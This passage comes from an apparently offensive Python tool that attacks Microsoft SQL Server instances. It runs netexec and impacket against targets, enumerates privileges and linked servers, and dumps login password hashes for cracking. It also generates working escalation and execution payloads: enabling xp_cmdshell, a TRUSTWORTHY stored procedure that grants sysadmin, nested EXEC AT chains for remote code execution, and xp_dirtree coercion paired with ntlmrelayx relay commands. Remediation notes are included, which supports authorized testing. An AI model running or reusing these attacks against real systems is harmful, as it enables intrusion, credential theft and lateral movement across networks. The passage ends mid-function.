                "smb://<dc-or-host> -smb2support running"),
              "Relay the SQL service account (often privileged) to another host."),
    ]
    return steps


# --- attack chain (the 'so what') -----------------------------------------------

def attack_chain(target: dict, fs: list[dict], creds: dict | None) -> list[str]:
    """A short, grounded chain narrative for the target, from entry to effect."""
    tgt = f"{target['ip']}:{target.get('port', 1433)}"
    have = [f for f in fs if f["target"] == tgt]
    lines = []
    entry = "valid credentials" if creds and creds.get("user") else None
    if any("blank password" in f["title"].lower() for f in have):
        entry = "the blank-password login (sa)"
    if entry:
        chain = [f"Foothold: {entry} on {tgt}"]
        if any("xp_cmdshell is enabled" in f["title"].lower() for f in have):
            chain.append("xp_cmdshell is already on -> OS command execution now")
        else:
            chain.append("escalate to sysadmin (impersonation / TRUSTWORTHY / linked server)")
        chain.append("enable + run xp_cmdshell (or OLE/CLR) as the service account")
        chain.append("capture/relay the service account or hop linked servers to move laterally")
        lines.append("Likely path: " + " -> ".join(chain) + ".")
    else:
        lines.append(f"{tgt}: no confirmed entry yet - run the no-cred checks (blank sa, "
                     "relay) or supply credentials to walk the MSSQLPwner route.")
    return lines


# --- live nxc mssql (access + privilege matrix; auto-run when present) ----------

def nxc_tool() -> str | None:
    from . import credenum
    return credenum.smb_tool()             # nxc / netexec / crackmapexec / cme


def parse_nxc_mssql(output: str) -> dict:
    """Parse `nxc mssql <ip> -u U -p P`. Returns
    {access, admin, banner}: whether the creds logged in, whether admin (Pwn3d!)."""
    access = admin = False
    banner = ""
    for raw in output.splitlines():
        line = raw.strip()
        low = line.lower()
        if "mssql" not in low:
            continue
        if "[+]" in line:
            access = True
            if "pwn3d" in low:            # the only real netexec admin marker; a
                admin = True              # loose "(admin)" substring false-flagged
        if "(name:" in low or "(domain:" in low:
            banner = line
    return {"access": access, "admin": admin, "banner": banner}


def run_nxc_mssql(ip: str, creds: dict, port: int = _DEFAULT_PORT,
                  local_auth: bool = False) -> tuple[dict | None, str | None]:
    """Run nxc mssql for the access/privilege check. Returns (parsed, error).
    (parsed is None when nxc isn't installed - the caller falls back to commands.)"""
    from . import credenum
    tool = nxc_tool()
    if not tool:
        return None, "netexec/nxc not installed"
    cmd = [tool, "mssql", ip, "-u", creds.get("user", ""),
           "-p", creds.get("secret", "")]
    if creds.get("domain") and not local_auth:
        cmd += ["-d", creds["domain"]]
    if local_auth:
        cmd += ["--local-auth"]
    if port and port != _DEFAULT_PORT:
        cmd += ["--port", str(port)]
    out, err = credenum._run(cmd)
    if err:
        return None, err
    return parse_nxc_mssql(out), None


# --- live enumeration via impacket-mssqlclient ----------------------------------
# Each query's result is bracketed by sentinel SELECTs so we can extract it
# robustly from impacket's tabular output. Every row is emitted as a single
# '|'-delimited string (one column) so parsing is trivial and format-independent.
_ENUM_SECTIONS = {
    "server": "SELECT CAST(SERVERPROPERTY('MachineName') AS varchar(128))+'|'+"
              "CAST(SYSTEM_USER AS varchar(128))+'|'+"
              "CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(4))+'|'+"
              "CAST(ISNULL(SERVERPROPERTY('IsIntegratedSecurityOnly'),0) AS varchar(4))+'|'+"
              "CAST(SERVERPROPERTY('ProductVersion') AS varchar(64))",
    "logins": "SELECT name+'|'+CAST(IS_SRVROLEMEMBER('sysadmin',name) AS varchar(4)) "
              "FROM sys.server_principals WHERE type IN ('S','U','G') AND name NOT LIKE '##%'",
    "databases": "SELECT name+'|'+CAST(is_trustworthy_on AS varchar(4))+'|'+"
                 "ISNULL(SUSER_SNAME(owner_sid),'') FROM sys.databases",
    "links": "SELECT name+'|'+ISNULL(product,'')+'|'+ISNULL(data_source,'') "
             "FROM sys.servers WHERE is_linked=1",
    "impersonate": "SELECT DISTINCT b.name+'|'+CAST(IS_SRVROLEMEMBER('sysadmin',b.name) "
                   "AS varchar(4)) FROM sys.server_permissions a JOIN sys.server_principals b "
                   "ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE'",
    "config": "SELECT name+'|'+CAST(value_in_use AS varchar(8)) FROM sys.configurations "
              "WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled')",
    "hashes": "SELECT name+'|'+CONVERT(varchar(max),password_hash,1) FROM sys.sql_logins "
              "WHERE password_hash IS NOT NULL",
    "credentials": "SELECT name+'|'+ISNULL(credential_identity,'') FROM sys.credentials",
    "proxies": "SELECT p.name+'|'+ISNULL(c.credential_identity,'') FROM msdb.dbo.sysproxies p "
               "LEFT JOIN sys.credentials c ON p.credential_id=c.credential_id",
    "linkedlogins": "SELECT s.name+'|'+ISNULL(ll.remote_name,'')+'|'+"
                    "CAST(ISNULL(ll.uses_self_credential,0) AS varchar(4)) FROM sys.servers s "
                    "JOIN sys.linked_logins ll ON s.server_id=ll.server_id "
                    "WHERE s.is_linked=1 AND ll.remote_name IS NOT NULL AND ll.remote_name<>''",
    # Effective server-level permissions the current login holds (beyond the
    # sysadmin role) - CONTROL SERVER, IMPERSONATE ANY LOGIN, ALTER ANY LOGIN, ...
    "serverperms": "SELECT permission_name+'|'+state_desc FROM sys.fn_my_permissions(NULL,'SERVER')",
    # Server permissions granted to the public role (every login inherits these).
    "publicserver": "SELECT pmk.permission_name+'|'+pmk.state_desc FROM sys.server_permissions pmk "
                    "JOIN sys.server_principals sp ON pmk.grantee_principal_id=sp.principal_id "
                    "WHERE sp.name='public' AND pmk.state_desc='GRANT'",
    # Startup stored procedures (auto-run as sysadmin at service start - persistence).
    "startup": "SELECT name+'|startup' FROM master.sys.procedures "
               "WHERE OBJECTPROPERTY(object_id,'ExecIsStartup')=1",
}

# Server permissions that grant privilege escalation / control without the sysadmin
# role - holding any of these is effectively (or a step from) instance takeover.
_DANGEROUS_SERVER_PERMS = {
    "CONTROL SERVER", "ALTER ANY LOGIN", "ALTER ANY SERVER ROLE",
    "IMPERSONATE ANY LOGIN", "ALTER ANY CREDENTIAL", "CREATE SERVER ROLE",
    "ALTER ANY LINKED SERVER", "ADMINISTER BULK OPERATIONS", "ALTER SETTINGS",
    "EXTERNAL ACCESS ASSEMBLY", "UNSAFE ASSEMBLY", "ALTER ANY EVENT SESSION",
}
# Baseline public server permissions - anything beyond these is over-granted.
_BASELINE_PUBLIC_SERVER = {"CONNECT SQL", "VIEW ANY DATABASE"}


def mssqlclient_tool() -> str | None:
    from . import credenum
    return credenum.impacket_tool("mssqlclient")


def build_enum_script() -> str:
    """The T-SQL fed to impacket-mssqlclient over stdin: each section wrapped in
    @@B:<name>/@@E:<name> sentinels, then exit."""
    lines = []
    for name, q in _ENUM_SECTIONS.items():
        lines.append(f"SELECT '@@B:{name}'")
        lines.append(q)
        lines.append(f"SELECT '@@E:{name}'")
    lines.append("exit")
    return "\n".join(lines) + "\n"


def _run_stdin(cmd: list[str], data: str, timeout: int = 180) -> tuple[str, str | None]:
    import subprocess
    try:
        p = subprocess.run(cmd, input=data, capture_output=True, text=True,
                           errors="replace", timeout=timeout)
        return (p.stdout or "") + (p.stderr or ""), None
    except subprocess.TimeoutExpired:
        return "", f"timed out after {timeout}s"
    except (OSError, ValueError) as e:
        return "", str(e)


def parse_enum(output: str) -> dict:
    """Pull each sentinel-wrapped section out of impacket-mssqlclient output.
    Returns {section: [[col, ...], ...]} - each row split on '|'."""
    import re
    sections: dict[str, list] = {}
    for name in _ENUM_SECTIONS:
        m = re.search(rf"@@B:{name}\b(.*?)@@E:{name}\b", output, re.S)
        rows = []
        if m:
            for line in m.group(1).splitlines():
                line = line.strip()
                if "|" in line and "----" not in line and not line.startswith("@@"):
                    rows.append([c.strip() for c in line.split("|")])
        sections[name] = rows
    return sections


def _mssqlclient_cmd(ip: str, creds: dict, port: int, windows_auth: bool) -> list[str] | None:
    tool = mssqlclient_tool()
    if not tool:
        return None
    user, secret, dom = creds.get("user", ""), creds.get("secret", ""), creds.get("domain", "")
    if windows_auth and dom:
        cmd = [tool, f"{dom}/{user}:{secret}@{ip}", "-windows-auth"]
    else:
        cmd = [tool, f"{user}:{secret}@{ip}"]
    if port and port != _DEFAULT_PORT:
        cmd += ["-port", str(port)]
    return cmd


def run_mssqlclient(ip: str, creds: dict, port: int = _DEFAULT_PORT,
                    windows_auth: bool = True) -> tuple[dict | None, str | None]:
    """Connect with impacket-mssqlclient and run the enumeration script. Returns
    (sections, error). sections is None when the tool is missing or login failed."""
    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)
    if cmd is None:
        return None, "impacket-mssqlclient not installed"
    out, err = _run_stdin(cmd, build_enum_script())
    if err:
        return None, err
    sections = parse_enum(out)
    if not sections.get("server"):
        return None, "login failed or nothing returned"
    return sections, None


def link_runner(ip: str, creds: dict, port: int = _DEFAULT_PORT,
                windows_auth: bool = True):
    """A runner(script)->output for walk_links: runs a batch on the ENTRY instance
    via impacket-mssqlclient. Returns a callable; '' on tool-missing / error."""
    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)

    def run(script: str) -> str:
        if cmd is None:
            return ""
        out, err = _run_stdin(cmd, script)
        return "" if err else out
    return run


def trustworthy_sysadmin_dbs(enum: dict) -> list[str]:
    """TRUSTWORTHY databases owned by a sysadmin - the db_owner->sysadmin candidates."""
    sysadmins = {r[0] for r in enum.get("logins", []) if len(r) > 1 and r[1] == "1"}
    out = []
    for r in enum.get("databases", []):
        if len(r) > 2 and r[1] == "1" and (r[2] in sysadmins or r[2].lower() == "sa"
                                           or r[2].lower().endswith("\\sa")):
            out.append(r[0])
    return out


def build_dbowner_script(dbs: list[str]) -> str:
    """Batch that checks db_owner membership in each db. DB_NAME() is returned
    alongside so a failed USE (context didn't change) can't yield a false result."""
    lines = []
    for i, db in enumerate(dbs):
        lines.append("USE [%s]" % db.replace("]", "]]"))
        lines.append(f"SELECT '@@DBO:{i}'")
        lines.append("SELECT CAST(ISNULL(IS_MEMBER('db_owner'),0) AS varchar(4))+'|'+DB_NAME()")
        lines.append(f"SELECT '@@DBOE:{i}'")
    lines.append("exit")
    return "\n".join(lines) + "\n"


def parse_dbowner(output: str, dbs: list[str]) -> dict:
    """{db: True} only when IS_MEMBER('db_owner')=1 AND DB_NAME() confirms the USE
    actually landed in that database."""
    import re
    result = {}
    for i, db in enumerate(dbs):
        m = re.search(rf"@@DBO:{i}\b(.*?)@@DBOE:{i}\b", output, re.S)
        ok = False
        if m:
            for line in m.group(1).splitlines():
                line = line.strip()
                if "|" in line and "----" not in line and not line.startswith("@@"):
                    parts = [c.strip() for c in line.split("|")]
                    ok = parts[0] == "1" and len(parts) > 1 and parts[1].lower() == db.lower()
                    break
        result[db] = ok
    return result


def verify_dbowner(dbs: list[str], runner) -> dict:
    """Run the db_owner check on the entry instance. `runner(script)->output`.
    Returns {db: bool} when the check ran, or {} when there was nothing to check
    OR the check couldn't run (tool missing / connect failed) - so an unverified
    candidate is never mistaken for a verified negative."""
    if not dbs:
        return {}
    out = runner(build_dbowner_script(dbs)) or ""
    if "@@DBO:" not in out:                 # the batch never executed - unknown, not False
        return {}
    return parse_dbowner(out, dbs)


def chains_from_enum(target: dict, enum: dict, creds: dict | None,
                     dbo_map: dict | None = None):
    """Turn a live enumeration into concrete findings + a grounded escalation chain
    for THIS instance. `dbo_map` (from verify_dbowner) confirms db_owner on the
    TRUSTWORTHY candidates. Returns (findings, chain_steps, summary)."""
    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
    ctx = _ctx(target, creds)
    fs: list[dict] = []
    chain: list[str] = []

    server = enum.get("server") or []
    me = (creds or {}).get("user", "")
    is_sa = False
    if server:
        row = server[0]
        me = row[1] if len(row) > 1 else me
        is_sa = len(row) > 2 and row[2] == "1"
        if len(row) > 4 and row[4] and not target.get("version"):
            target["version"] = row[4]
    target["live_login"] = me
    if is_sa:
        target["admin"] = True
    else:
        target.setdefault("access", True)

    sysadmins = {r[0] for r in enum.get("logins", []) if len(r) > 1 and r[1] == "1"}

    if is_sa:
        chain.append(f"already sysadmin as {me}")
        fs.append(_finding(
            "critical", "Credentials are sysadmin on this MSSQL instance", tgt,
            f"{me} is a member of the sysadmin server role (xp_cmdshell / RCE).",
            "nxc / impacket-mssqlclient",
            _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
            "Least-privilege the login; remove sysadmin.", ["CWE-250", "CWE-269"], kind="sysadmin_creds"))

    imp_sa = [r[0] for r in enum.get("impersonate", []) if len(r) > 1 and r[1] == "1"]
    if imp_sa and not is_sa:
        who = imp_sa[0]
        chain.append(f"impersonate sysadmin login '{who}' (EXECUTE AS)")
        fs.append(_finding(
            "high", "Impersonatable sysadmin login (privesc to sysadmin)", tgt,
            f"The login can EXECUTE AS LOGIN = '{who}', which is a sysadmin.",
            "impacket-mssqlclient",
            _fill(f"EXECUTE AS LOGIN = '{who}'; SELECT IS_SRVROLEMEMBER('sysadmin'); "
                  "-- then run xp_cmdshell; REVERT", ctx),
            "Remove IMPERSONATE grants pointing at sysadmin logins.", ["CWE-269"], kind="impersonation"))

    trust = [r for r in enum.get("databases", []) if len(r) > 2 and r[1] == "1"]
    trust_sa = trustworthy_sysadmin_dbs(enum)
    if trust_sa and not is_sa:
        # Prefer a CONFIRMED db (you are db_owner) when we verified; else a candidate.
        confirmed = [db for db in trust_sa if (dbo_map or {}).get(db)] if dbo_map else []
        if dbo_map is not None:
            usable = confirmed
        else:
            usable = trust_sa
        if usable:
            db = usable[0]
            proven = bool(confirmed and db in confirmed)
            chain.append(f"abuse TRUSTWORTHY db '{db}' (db_owner + EXECUTE AS OWNER)"
                         + ("" if proven else " if db_owner"))
            fs.append(_finding(
                "critical" if proven else "high",
                ("CONFIRMED privesc: db_owner on a TRUSTWORTHY db owned by a sysadmin"
                 if proven else "TRUSTWORTHY database owned by a sysadmin (privesc)"),
                tgt,
                (f"You ARE db_owner on TRUSTWORTHY db '{db}' (owned by a sysadmin) - "
                 "create a proc WITH EXECUTE AS OWNER to run as sysadmin."
                 if proven else
                 f"Database '{db}' is TRUSTWORTHY and owned by a sysadmin - if you are "
                 "db_owner there, escalate to sysadmin."),
                "impacket-mssqlclient",
                _fill(f"USE [{db}]; CREATE PROCEDURE dbo.x WITH EXECUTE AS OWNER AS "
                      "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x;", ctx),
                "Turn off TRUSTWORTHY; don't set a sysadmin as the owner of a user DB.",
                ["CWE-269"], kind="trustworthy"))

    links = [r[0] for r in enum.get("links", [])]
    if links:
        chain.append(f"hop linked server(s) {', '.join(links[:3])} (OPENQUERY / EXECUTE AT)")
        fs.append(_finding(
            "medium", f"{len(links)} linked server(s) reachable (lateral / privesc)", tgt,
            "Linked servers: " + ", ".join(links[:8]) + ". Linked logins often map to "
            "a privileged account (sa) on the remote.", "impacket-mssqlclient / mssqlpwner",
            _fill("SELECT * FROM OPENQUERY([%s], 'SELECT SYSTEM_USER, "
                  "IS_SRVROLEMEMBER(''sysadmin'')');" % links[0], ctx),
            "Review linked-server login mappings; avoid mapping to sysadmin.", ["CWE-284"], kind="linked_reachable"))

    cfg = {r[0]: r[1] for r in enum.get("config", []) if len(r) > 1}
    if cfg.get("xp_cmdshell") == "1":
        fs.append(_finding(
            "high", "xp_cmdshell is enabled (OS command execution)", tgt,
            "xp_cmdshell = 1 - run OS commands as the SQL service account now.",
            "nxc / impacket-mssqlclient",
            _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
            "Disable xp_cmdshell; run SQL under a low-privilege gMSA.", ["CWE-250"], kind="xp_cmdshell"))

    hashes = [r[0] for r in enum.get("hashes", [])]
    if hashes:
        fs.append(_finding(
            "high", f"Recovered {len(hashes)} SQL login password hash(es)", tgt,
            "Dumped sys.sql_logins hashes (" + ", ".join(hashes[:8]) + ") - crack "
            "offline with hashcat -m 1731 and reuse across the estate.",
            "impacket-mssqlclient",
            "hashcat -m 1731 mssql_hashes.txt wordlist.txt",
            "Rotate SQL logins; enforce a strong password policy.", ["CWE-522"], kind="hashes"))

    # Stored credential objects + Agent proxies -> the (often privileged) accounts
    # SQL Server holds a secret for. The identity is readable; the password is
    # decryptable with the Service Master Key (sysadmin) via PowerUpSQL.
    credentials = [(c[0], c[1] if len(c) > 1 else "") for c in enum.get("credentials", [])]
    proxies = [(p[0], p[1] if len(p) > 1 else "") for p in enum.get("proxies", [])]
    named_creds = [c for c in credentials if c[1]]
    if named_creds:
        who = ", ".join(f"{n} -> {i}" for n, i in named_creds[:6])
        fs.append(_finding(
            "high", f"{len(named_creds)} stored SQL credential object(s)", tgt,
            f"SQL Server holds a secret for: {who}"
            + (f"; Agent proxies: {', '.join(p[0] for p in proxies)}" if proxies else "")
            + ". The identity is shown; decrypt the password with the SMK (sysadmin).",
            "PowerUpSQL / mssqlpwner",
            _fill("PowerUpSQL: Get-SQLCredential -Instance <ip>   ;   "
                  "Get-SQLServerLinkedServerLogin -Instance <ip>   # decrypt with the SMK",
                  ctx),
            "Remove unused credentials/proxies; use gMSA over stored passwords.",
            ["CWE-522", "CWE-257"], kind="stored_credentials"))

    # Linked-server logins with a FIXED mapping (uses_self_credential=0) carry a
    # stored remote password - often mapping to sa on the remote instance.
    linkedlogins = [(l[0], l[1] if len(l) > 1 else "",
                     len(l) > 2 and l[2] == "1") for l in enum.get("linkedlogins", [])]
    fixed = [(srv, remote) for srv, remote, self_cred in linkedlogins
             if not self_cred and remote]
    if fixed:
        show = ", ".join(f"{srv}->{remote}" for srv, remote in fixed[:6])
        sev = "critical" if any(r.lower() == "sa" for _s, r in fixed) else "high"
        fs.append(_finding(
            sev, f"{len(fixed)} linked server(s) with a stored fixed login", tgt,
            f"Fixed linked-server credentials (server -> remote login): {show}. The "
            "stored password grants that login on the remote (often sa) - recover it "
            "with the Service Master Key.", "PowerUpSQL / mssqlpwner",
            _fill("PowerUpSQL: Get-SQLServerLinkedServerLogin -Instance <ip>   "
                  "# decrypts the stored linked-server passwords (sysadmin)", ctx),
            "Use self-mapping / least-privilege remote logins; avoid mapping to sa.",
            ["CWE-522", "CWE-257"], kind="linked_fixed_login"))
        chain.append("recover stored linked-server credential(s) ("
                     + ", ".join(f"{srv}->{remote}" for srv, remote in fixed[:3]) + ")")

    # Mixed-mode authentication (SQL logins allowed) - 'sa' exists and SQL logins
    # can be sprayed/brute-forced; the server row's IsIntegratedSecurityOnly is 0.
    intsec = server[0][3] if server and len(server[0]) > 3 else ""
    if intsec == "0":
        fs.append(_finding(
            "low", "Mixed-mode authentication enabled (SQL logins)", tgt,
            "The instance accepts SQL Server logins as well as Windows auth "
            "(IsIntegratedSecurityOnly=0), so 'sa' exists and SQL logins are exposed "
            "to password spraying / offline cracking.",
            "nxc", _fill("nxc mssql <ip> -u sa -p <wordline> --local-auth", ctx),
            "Prefer Windows-only auth; if SQL logins are required, enforce a strong "
            "password policy and disable/rename sa.", ["CWE-262"], kind="mixed_mode"))

    # Dangerous server-level permissions held by this login (beyond the sysadmin role).
    my_server = {r[0].upper() for r in enum.get("serverperms", []) if r and r[0]}
    danger = sorted(my_server & _DANGEROUS_SERVER_PERMS)
    if danger and not is_sa:
        chain.append(f"abuse server permission(s) {', '.join(danger[:3])}")
        fs.append(_finding(
            "high", "Dangerous server-level permission held (privesc without sysadmin)",
            tgt, f"This login holds {', '.join(danger)} at the server level - each is a "
            "direct or one-step path to sysadmin/RCE without being in the sysadmin role.",
            "impacket-mssqlclient",
            _fill("impacket-mssqlclient <domain>/<user>:<pass>@<ip>   # abuse: e.g. "
                  "IMPERSONATE ANY LOGIN -> EXECUTE AS; ALTER ANY LOGIN -> reset sa", ctx),
            "Revoke the permission; grant least privilege, not server-wide control.",
            ["CWE-269", "CWE-266"], kind="server_perms"))

    # Server permissions over-granted to the public role (every login inherits them).
    pub_server = sorted({r[0].upper() for r in enum.get("publicserver", []) if r and r[0]}
                        - _BASELINE_PUBLIC_SERVER)
    if pub_server:
        sev = "high" if (set(pub_server) & _DANGEROUS_SERVER_PERMS) else "medium"
        fs.append(_finding(
            sev, "Server permission granted to public (every login inherits it)", tgt,
            f"The public role is granted {', '.join(pub_server)} at the server level - "
            "every authenticated login, however low-privileged, holds this.",
            "impacket-mssqlclient",
            _fill("SELECT * FROM sys.server_permissions p JOIN sys.server_principals s "
                  "ON p.grantee_principal_id=s.principal_id WHERE s.name='public';", ctx),
            "Revoke non-baseline grants from public.", ["CWE-284", "CWE-732"],
            kind="public_role"))

    # Startup stored procedures - auto-run as sysadmin at every service start.
    startup = [r[0] for r in enum.get("startup", []) if r and r[0]]
    if startup:
        fs.append(_finding(
            "medium", f"{len(startup)} startup stored procedure(s) present", tgt,
            "Startup procedures run automatically as sysadmin every time the SQL "
            "service starts: " + ", ".join(startup[:8]) + ". They are a common "
            "persistence mechanism (and a supply-chain risk) - review each.",
            "impacket-mssqlclient",
            _fill("SELECT name FROM master.sys.procedures WHERE "
                  "OBJECTPROPERTY(object_id,'ExecIsStartup')=1;", ctx),
            "Remove unexpected startup procedures; disable 'scan for startup procs' if "
            "not needed.", ["CWE-506"], kind="startup_proc"))

    if not is_sa and not chain:
        chain.append(f"low-priv login as {me} - hunt for a linked-server or db_owner path")
    summary = {
        "login": me, "is_sysadmin": is_sa, "sysadmins": sorted(sysadmins),
        "mixed_mode": intsec == "0", "server_perms": sorted(my_server),
        "public_server": pub_server, "startup": startup,
        "logins": [r[0] for r in enum.get("logins", [])],
        "databases": enum.get("databases", []),
        "trustworthy": [r[0] for r in trust], "links": links,
        "impersonate": [r[0] for r in enum.get("impersonate", [])],
        "config": cfg, "hashes": hashes,
        "dbowner_confirmed": [db for db in trust_sa if (dbo_map or {}).get(db)],
        "credentials": [f"{n} -> {i}" if i else n for n, i in credentials],
        "proxies": [f"{n} -> {i}" if i else n for n, i in proxies],
        "linkedlogins": [f"{s}->{r}" + ("" if sc else " [fixed]")
                         for s, r, sc in linkedlogins],
    }
    return fs, chain, summary


# --- recursive linked-server walk (the MSSQLPwner graph) ------------------------
# The identity/privilege/sublinks query run AT each remote node. Uses the
# FOR XML PATH trick (works on 2008+) to concatenate the node's own linked servers.
_LINK_INNER = (
    "SELECT CAST(@@SERVERNAME AS varchar(128))+'|'+CAST(SYSTEM_USER AS varchar(128))+'|'+"
    "CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(4))+'|'+ISNULL(STUFF((SELECT ','+name "
    "FROM sys.servers WHERE is_linked=1 FOR XML PATH('')),1,1,''),'')")
# The command run AT a node for effect (RCE) once you hold sysadmin there.
_RCE_INNER = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
              "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'")


def _nested_at(path: list[str], inner: str) -> str:
    """Wrap `inner` in EXEC('...') AT [link] for each hop in `path` (entry->path[0]
    ->path[1]->...). Single quotes are doubled once per level - the standard
    linked-server chaining. path=[] returns inner unchanged."""
    s = inner
    for link in reversed(path):
        s = "EXEC ('%s') AT [%s]" % (s.replace("'", "''"), link)
    return s


def _parse_link_node(output: str, idx: int) -> dict | None:
    """Pull the '@@L:idx .. @@LE:idx'-wrapped result row for one path."""
    import re
    m = re.search(rf"@@L:{idx}\b(.*?)@@LE:{idx}\b", output, re.S)
    if not m:
        return None
    for line in m.group(1).splitlines():
        line = line.strip()
        if "|" in line and "----" not in line and not line.startswith("@@"):
            parts = [c.strip() for c in line.split("|")]
            return {"server": parts[0] if parts else "",
                    "login": parts[1] if len(parts) > 1 else "",
                    "sysadmin": len(parts) > 2 and parts[2] == "1",
                    "links": [x for x in (parts[3].split(",") if len(parts) > 3 else []) if x]}
    return None


def walk_links(entry_links: list[str], runner, max_depth: int = 4,
               max_nodes: int = 60) -> list[dict]:
    """BFS the linked-server graph from the entry instance. `entry_links` is the
    entry's own linked-server names; `runner(script)->output` runs a sentinel batch
    ON THE ENTRY instance (the nested EXEC AT reaches through). Returns nodes:
    {path, depth, server, login, sysadmin, links}. Cycles + depth + node count are
    all bounded so a bidirectional linked-server mesh can't loop forever."""
    nodes: list[dict] = []
    expanded: set[str] = set()
    frontier = [[link] for link in entry_links]
    depth = 1
    while frontier and depth <= max_depth and len(nodes) < max_nodes:
        parts = []
        for i, path in enumerate(frontier):
            parts.append(f"SELECT '@@L:{i}'")
            parts.append(_nested_at(path, _LINK_INNER))
            parts.append(f"SELECT '@@LE:{i}'")
        out = runner("\n".join(parts) + "\nexit\n") or ""
        nxt = []
        for i, path in enumerate(frontier):
            if len(nodes) >= max_nodes:
                break
            info = _parse_link_node(out, i)
            if info is None:                       # RPC off / link down / access denied
                continue
            nodes.append({"path": path, "depth": depth, "server": info["server"],
                          "login": info["login"], "sysadmin": info["sysadmin"],
                          "links": info["links"]})
            key = (info["server"] or "|".join(path)).upper()
            if key in expanded:                    # already expanded this server - cycle
                continue
            expanded.add(key)
            path_servers = {p.upper() for p in path} | {key}
            for child in info["links"]:
                if child.upper() not in path_servers:   # don't re-enter a server on this path
                    nxt.append(path + [child])
        frontier = nxt
        depth += 1
    return nodes


def link_findings(target: dict, nodes: list[dict], creds: dict | None):
    """Findings + chain steps from a linked-server walk. Every node reachable as
    sysadmin is a full compromise of that instance (enumerate + RCE commands)."""
    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
    fs: list[dict] = []
    chain: list[str] = []
    sa_nodes = [n for n in nodes if n["sysadmin"]]
    for n in sa_nodes:
        route = " -> ".join([target.get("live_login") or "entry"] + n["path"])
        server = n["server"] or n["path"][-1]
        fs.append(_finding(
            "critical", f"Linked-server chain to SYSADMIN on {server}", tgt,
            f"Reachable as sysadmin ({n['login']}) on {server} via {route} "
            f"(depth {n['depth']}).", "impacket-mssqlclient / mssqlpwner",
            _nested_at(n["path"], _RCE_INNER),
            "Fix the linked-server login mapping (don't map to sysadmin); disable "
            "'rpc out' where not required.", ["CWE-269", "CWE-284"], kind="linked_sysadmin"))
        chain.append(f"reach SYSADMIN on {server} via linked chain ({route}) -> "
                     "xp_cmdshell RCE")
    if nodes and not sa_nodes:
        deepest = max(nodes, key=lambda n: n["depth"])
        fs.append(_finding(
            "medium", f"Linked-server graph: {len(nodes)} instance(s) reachable", tgt,
            "Reachable linked instances: " + ", ".join(
                (n["server"] or n["path"][-1]) + (" [sa]" if n["sysadmin"] else "")
                for n in nodes[:10]) + f". Deepest: {' -> '.join(deepest['path'])}.",
            "impacket-mssqlclient / mssqlpwner",
            _nested_at(deepest["path"], "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"),
            "Review linked-server login mappings and 'rpc out' settings.", ["CWE-284"], kind="linked_reachable"))
    return fs, chain


# --- UNC coercion -> NTLM relay (capture the service account) -------------------

def relay_targets(hosts: list[Host], self_ip: str) -> list[dict]:
    """Where the SQL service account's relayed NetNTLM is worth landing: LDAP on a
    DC (RBCD / shadow creds / add computer), another MSSQL (sysadmin if the account
    is admin there), and SMB on signing-not-required hosts (local admin)."""
    from . import ad
    out = []
    for dc in ad.domain_controllers(hosts):
        out.append({"kind": "ldap", "target": dc.ip,
                    "cmd": f"impacket-ntlmrelayx -t ldaps://{dc.ip} --delegate-access "
                           "--no-dump --no-da   # RBCD onto the relayed computer/account",
                    "why": "Relay to LDAP -> RBCD / shadow credentials / add a computer."})
    for t in mssql_targets(hosts):
        if t["ip"] != self_ip:
            out.append({"kind": "mssql", "target": f"{t['ip']}:{t['port']}",
                        "cmd": f"impacket-ntlmrelayx -t mssql://{t['ip']} -smb2support",
                        "why": "Relay to another MSSQL - sysadmin there if the service "
                               "account is admin."})
    for h in ad.relay_targets(hosts):
        if h.ip != self_ip:
            out.append({"kind": "smb", "target": h.ip,
                        "cmd": f"impacket-ntlmrelayx -t smb://{h.ip} -smb2support -c 'whoami'",
                        "why": "SMB signing not required -> relay for local admin / exec."})
    return out


def relay_finding(target: dict, rtargets: list[dict], lhost: str,
                  creds: dict | None):
    """A concrete UNC->relay finding: run ntlmrelayx at a real target, then trigger
    the SQL service account to authenticate via xp_dirtree."""
    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
    ctx = _ctx(target, creds, lhost)
    top = rtargets[0] if rtargets else {
        "cmd": "impacket-ntlmrelayx -t smb://<relay-target> -smb2support",
        "why": "pick a relay target (DC LDAP / another MSSQL / SMB-signing-off host)."}
    detail = ("Relay the SQL service account's NetNTLM. Targets: "
              + ", ".join(f"{r['kind']}:{r['target']}" for r in rtargets[:6])
              if rtargets else "No relay targets discovered yet - run enum first.")
    cmd = (f"# 1) listener:  {top['cmd']}\n"
           f"# 2) trigger (recce can run this with --relay):  "
           + _fill("EXEC master..xp_dirtree '\\\\<LHOST>\\recce';", ctx))
    return _finding(
        "high", "UNC coercion -> NTLM relay of the SQL service account", tgt, detail,
        "impacket-ntlmrelayx + mssqlclient", cmd,
        "Enforce SMB signing + LDAP channel binding/EPA; run SQL under a low-priv gMSA.",
        ["CWE-522", "CWE-269"], kind="relay")


def run_xp_dirtree(ip: str, creds: dict, lhost: str, port: int = _DEFAULT_PORT,
                   windows_auth: bool = True) -> tuple[bool, str | None]:
    """Trigger the SQL service account to authenticate to `lhost` via xp_dirtree
    (the operator runs ntlmrelayx). Returns (triggered, error)."""
    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)
    if cmd is None:
        return False, "impacket-mssqlclient not installed"
    share = lhost.replace("'", "")
    script = f"EXEC master..xp_dirtree '\\\\{share}\\recce'\nexit\n"
    out, err = _run_stdin(cmd, script)
    if err:
        return False, err
    return True, None


# --- command execution for effect (xp_cmdshell / OLE / Agent / CLR) -------------
_EXEC_TMP = r"C:\Windows\Temp\recce_out.txt"


def _tsql_lit(s: str) -> str:
    """Escape a value for a single-quoted T-SQL string literal."""
    return (s or "").replace("'", "''")


def build_exec_script(command: str, method: str = "xp") -> str | None:
    """T-SQL that runs `command` via the chosen primitive and returns its output
